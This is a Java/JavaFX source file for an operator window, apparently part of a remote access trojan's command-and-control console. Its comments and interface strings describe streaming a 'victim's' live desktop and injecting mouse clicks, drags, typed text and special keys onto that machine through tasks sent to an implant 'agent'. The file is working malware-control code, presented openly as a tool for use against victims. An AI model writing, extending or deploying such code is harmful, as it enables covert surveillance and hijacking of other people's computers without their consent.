package ui.dialogs;

import models.Session;
import models.Task;
import service.ApiService;
import javafx.application.Platform;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.*;
import javafx.scene.input.KeyCode;
import javafx.scene.input.MouseButton;
import javafx.scene.layout.*;
import javafx.stage.Stage;
import javafx.stage.Window;

import java.io.ByteArrayInputStream;
import java.util.Base64;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * HiddenDesktopWindow — LIVE interactive remote desktop viewer.
 *
 * Shows victim's ACTUAL desktop (wallpaper, icons, windows, taskbar) in real-time.
 * Operator can:
 *   - View live screen (refreshes every 200ms)
 *   - Click anywhere → mouse click injected on victim
 *   - Drag mouse → move windows on victim
 *   - Type text → keyboard input injected on victim
 *   - Press special keys (Enter, Esc, etc.)
 *
 * Uses DEFAULT desktop capture (not hidden desktop) — shows everything victim sees.
 */
public class HiddenDesktopWindow {

    private final ApiService api;
    private final Session session;
    private final Window parentWindow;
    private Stage stage;

    private ImageView imageView;
    private Label statusLabel;
    private Label fpsLabel;
    private ScrollPane scrollPane;
    private ScheduledExecutorService framePoller;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicBoolean frameInFlight = new AtomicBoolean(false);

    // Screen dimensions (updated from frames)
    private volatile int screenWidth = 1920;
    private volatile int screenHeight = 1080;

    // FPS counter
    private final AtomicInteger frameCount = new AtomicInteger(0);
    private long lastFpsTime = 0;

    // Style
    private static final String BG = "#0a0e14";
    private static final String FG = "#c9d1d9";
    private static final String DIM = "#8b949e";
    private static final String ACCENT = "#58a6ff";
    private static final String OK = "#3fb950";
    private static final String ERR = "#f85149";

    public HiddenDesktopWindow(Stage parentStage, ApiService api, Session session) {
        this.api = api;
        this.session = session;
        this.parentWindow = parentStage;
    }

    public void show() {
        stage = new Stage();
        if (parentWindow != null) {
            stage.initOwner(parentWindow);
        }
        stage.setTitle("Live Desktop — " + session.getUsername() + "@" + session.getHostname());
        stage.setMinWidth(1000);
        stage.setMinHeight(700);

        VBox root = new VBox(0);
        root.setStyle("-fx-background-color: " + BG + ";");

        // ── Toolbar ──
        HBox toolbar = new HBox(10);
        toolbar.setPadding(new Insets(8, 12, 8, 12));
        toolbar.setStyle("-fx-background-color: #161b22; -fx-border-color: #30363d; -fx-border-width: 0 0 1 0;");
        toolbar.setAlignment(Pos.CENTER_LEFT);

        Label title = new Label("🖥  Live Desktop — " + session.getUsername() + "@" + session.getHostname());
        title.setStyle("-fx-text-fill: " + FG + "; -fx-font-size: 13px; -fx-font-weight: bold;");

        Region spacer = new Region();
        HBox.setHgrow(spacer, Priority.ALWAYS);

        fpsLabel = new Label("FPS: 0");
        fpsLabel.setStyle("-fx-text-fill: " + OK + "; -fx-font-size: 11px; -fx-font-family: monospace;");

        Button refreshBtn = new Button("🔄 Refresh");
        refreshBtn.setStyle(btnStyle("#161b22", FG));
        refreshBtn.setOnAction(e -> requestFrame());

        Button stopBtn = new Button("✕ Close");
        stopBtn.setStyle(btnStyle("#161b22", FG));
        stopBtn.setOnAction(e -> stopStreaming());

        toolbar.getChildren().addAll(title, spacer, fpsLabel, refreshBtn, stopBtn);
        root.getChildren().add(toolbar);

        // ── Status bar ──
        statusLabel = new Label("Connecting to live desktop...");
        statusLabel.setMaxWidth(Double.MAX_VALUE);
        statusLabel.setStyle("-fx-text-fill: " + DIM + "; -fx-font-size: 11px;"
            + " -fx-padding: 4px 12px; -fx-background-color: #0d1117;");
        root.getChildren().add(statusLabel);

        // ── Image view (live desktop) ──
        imageView = new ImageView();
        imageView.setPreserveRatio(true);
        imageView.setSmooth(true);
        imageView.setFitWidth(960);
        imageView.setStyle("-fx-background-color: black;");

        // Mouse click handler — send click to agent
        imageView.setOnMouseClicked(e -> {
            double imgW = imageView.getBoundsInParent().getWidth();
            double imgH = imageView.getBoundsInParent().getHeight();
            if (imgW <= 0 || imgH <= 0) return;

            // Calculate actual screen coordinates
            double scaleX = (double) screenWidth / imgW;
            double scaleY = (double) screenHeight / imgH;
            int x = (int)(e.getX() * scaleX);
            int y = (int)(e.getY() * scaleY);

            if (e.getButton() == MouseButton.SECONDARY) {
                sendCommand("hidden_desktop", "click " + x + " " + y);  // right click = same for now
            } else {
                sendCommand("hidden_desktop", "click " + x + " " + y);
            }
        });

        // Mouse drag handler — for dragging windows
        imageView.setOnMousePressed(e -> {
            if (e.getButton() == MouseButton.PRIMARY) {
                double imgW = imageView.getBoundsInParent().getWidth();
                double imgH = imageView.getBoundsInParent().getHeight();
                if (imgW > 0 && imgH > 0) {
                    int x = (int)(e.getX() * (screenWidth / imgW));
                    int y = (int)(e.getY() * (screenHeight / imgH));
                    sendCommand("hidden_desktop", "down " + x + " " + y);
                }
            }
        });

        imageView.setOnMouseDragged(e -> {
            double imgW = imageView.getBoundsInParent().getWidth();
            double imgH = imageView.getBoundsInParent().getHeight();
            if (imgW > 0 && imgH > 0) {
                int x = (int)(e.getX() * (screenWidth / imgW));
                int y = (int)(e.getY() * (screenHeight / imgH));
                sendCommand("hidden_desktop", "move " + x + " " + y);
            }
        });

        imageView.setOnMouseReleased(e -> {
            if (e.getButton() == MouseButton.PRIMARY) {
                double imgW = imageView.getBoundsInParent().getWidth();
                double imgH = imageView.getBoundsInParent().getHeight();
                if (imgW > 0 && imgH > 0) {
                    int x = (int)(e.getX() * (screenWidth / imgW));
                    int y = (int)(e.getY() * (screenHeight / imgH));
                    sendCommand("hidden_desktop", "up " + x + " " + y);
                }
            }
        });

        scrollPane = new ScrollPane(imageView);
        scrollPane.setStyle("-fx-background: " + BG + "; -fx-border-color: transparent;");
        scrollPane.setFitToWidth(true);
        scrollPane.setFitToHeight(true);
        VBox.setVgrow(scrollPane, Priority.ALWAYS);
        root.getChildren().add(scrollPane);

        // ── Input bar ──
        HBox inputBar = new HBox(8);
        inputBar.setPadding(new Insets(8, 12, 8, 12));
        inputBar.setStyle("-fx-background-color: #161b22; -fx-border-color: #30363d; -fx-border-width: 1 0 0 0;");

        TextField typeField = new TextField();
        typeField.setPromptText("Type text to send to victim's desktop...");
        typeField.setStyle("-fx-background-color: #0d1117; -fx-text-fill: " + FG + ";"
            + " -fx-border-color: #30363d; -fx-border-radius: 4px; -fx-padding: 6px 10px;");
        HBox.setHgrow(typeField, Priority.ALWAYS);

        Button typeBtn = new Button("📤 Type");
        typeBtn.setStyle(btnStyle(ACCENT, "#ffffff"));
        typeBtn.setOnAction(e -> {
            String text = typeField.getText();
            if (!text.isEmpty()) {
                sendCommand("hidden_desktop", "type " + text);
                typeField.clear();
            }
        });

        // Quick keys
        Button enterBtn = new Button("⏎ Enter");
        enterBtn.setStyle(btnStyle("#161b22", FG));
        enterBtn.setOnAction(e -> sendCommand("hidden_desktop", "key 0x0D"));

        Button escBtn = new Button("Esc");
        escBtn.setStyle(btnStyle("#161b22", FG));
        escBtn.setOnAction(e -> sendCommand("hidden_desktop", "key 0x1B"));

        Button tabBtn = new Button("Tab");
        tabBtn.setStyle(btnStyle("#161b22", FG));
        tabBtn.setOnAction(e -> sendCommand("hidden_desktop", "key 0x09"));

        Button winBtn = new Button("⊞ Win");
        winBtn.setStyle(btnStyle("#161b22", FG));
        winBtn.setOnAction(e -> sendCommand("hidden_desktop", "key 0x5B"));

        inputBar.getChildren().addAll(typeField, typeBtn, enterBtn, escBtn, tabBtn, winBtn);
        root.getChildren().add(inputBar);

        // Enter key in text field → type
        typeField.setOnKeyPressed(e -> {
            if (e.getCode() == KeyCode.ENTER) {
                typeBtn.fire();
            }
        });

        Scene scene = new Scene(root, 1100, 750);
        stage.setScene(scene);

        // Start streaming
        startStreaming();

        // Stop on close
        stage.setOnCloseRequest(e -> stopStreaming());

        stage.show();
    }

    // ── Streaming ────────────────────────────────────────────────────────

    private void startStreaming() {
        running.set(true);
        updateStatus("Starting live stream...", ACCENT);

        // Start frame poller — poll every 3 seconds (must be > agent sleep time)
        // If agent sleep is 5s, polling at 3s ensures we don't flood task queue
        framePoller = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "hidden-desktop-poller");
            t.setDaemon(true);
            return t;
        });
        framePoller.scheduleAtFixedRate(() -> {
            if (running.get() && !frameInFlight.get()) {
                requestFrame();
            }
        }, 500, 3000, TimeUnit.MILLISECONDS);  // 500ms initial, 3000ms intervals

        lastFpsTime = System.currentTimeMillis();
    }

    private void stopStreaming() {
        running.set(false);
        frameInFlight.set(false);  // Allow any pending request to exit

        if (framePoller != null) {
            framePoller.shutdownNow();
            try {
                framePoller.awaitTermination(500, TimeUnit.MILLISECONDS);
            } catch (InterruptedException e) {
                // Ignore
            }
            framePoller = null;
        }
        if (stage != null && stage.isShowing()) {
            Platform.runLater(() -> stage.close());
        }
    }

    private void requestFrame() {
        if (!running.get()) return;  // Double-check before sending

        if (!frameInFlight.compareAndSet(false, true)) {
            return;
        }

        final String taskId;
        try {
            taskId = api.sendTask(session.getId(), "hidden_desktop", "live");
        } catch (Exception e) {
            frameInFlight.set(false);
            return;
        }

        // Poll for result — retry up to 3 times with 2s delay (matches agent sleep cycle)
        Thread poller = new Thread(() -> {
            for (int i = 0; i < 3 && running.get(); i++) {
                try {
                    Thread.sleep(2000);  // Wait for agent to process
                    if (!running.get()) break;  // Check again after sleep

                    Session updated = api.getSession(session.getId());
                    if (updated.getTasks() != null) {
                        for (Task t : updated.getTasks()) {
                            if (t.getId().equals(taskId) && "completed".equals(t.getStatus())) {
                                String result = t.getResult();
                                if (result != null && result.startsWith("FRAME:")) {
                                    Platform.runLater(() -> displayFrame(result));
                                }
                                frameInFlight.set(false);
                                return;
                            }
                        }
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    // Retry
                }
            }
            frameInFlight.set(false);
        }, "hd-frame-poller");
        poller.setDaemon(true);
        poller.start();
    }

    private void displayFrame(String frameData) {
        try {
            // Parse: "FRAME:<width>:<height>:<base64>\n"
            String[] parts = frameData.split(":", 4);
            if (parts.length < 4) {
                updateStatus("Bad frame format", ERR);
                return;
            }

            int w = Integer.parseInt(parts[1].trim());
            int h = Integer.parseInt(parts[2].trim());
            String b64 = parts[3].trim();

            // Remove trailing newline
            if (b64.endsWith("\n")) {
                b64 = b64.substring(0, b64.length() - 1);
            }

            screenWidth = w;
            screenHeight = h;

            byte[] bmpBytes = Base64.getDecoder().decode(b64);
            Image image = new Image(new ByteArrayInputStream(bmpBytes));

            if (image.getException() != null) {
                updateStatus("Image error: " + image.getException().getMessage(), ERR);
                return;
            }

            imageView.setImage(image);

            // Update FPS
            int frames = frameCount.incrementAndGet();
            long now = System.currentTimeMillis();
            if (now - lastFpsTime > 1000) {
                Platform.runLater(() -> fpsLabel.setText("FPS: " + frames));
                frameCount.set(0);
                lastFpsTime = now;
            }

            updateStatus("Live — " + w + "x" + h + " | Streaming", OK);
        } catch (Exception e) {
            updateStatus("Frame decode error: " + e.getMessage(), ERR);
        }
    }

    // ── Input injection ──────────────────────────────────────────────────

    private void sendCommand(String command, String args) {
        new Thread(() -> {
            try {
                api.sendTask(session.getId(), command, args);
            } catch (Exception e) {
                Platform.runLater(() -> updateStatus("Command failed: " + e.getMessage(), ERR));
            }
        }).start();
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private void updateStatus(String text, String color) {
        Platform.runLater(() -> {
            statusLabel.setText(text);
            statusLabel.setStyle("-fx-text-fill: " + color + "; -fx-font-size: 11px;"
                + " -fx-padding: 4px 12px; -fx-background-color: #0d1117;");
        });
    }

    private String btnStyle(String bg, String fg) {
        return "-fx-background-color: " + bg + ";"
            + " -fx-text-fill: " + fg + ";"
            + " -fx-font-size: 11px;"
            + " -fx-font-weight: bold;"
            + " -fx-padding: 6px 14px;"
            + " -fx-border-color: #30363d;"
            + " -fx-border-radius: 4px;"
            + " -fx-cursor: hand;";
    }
}
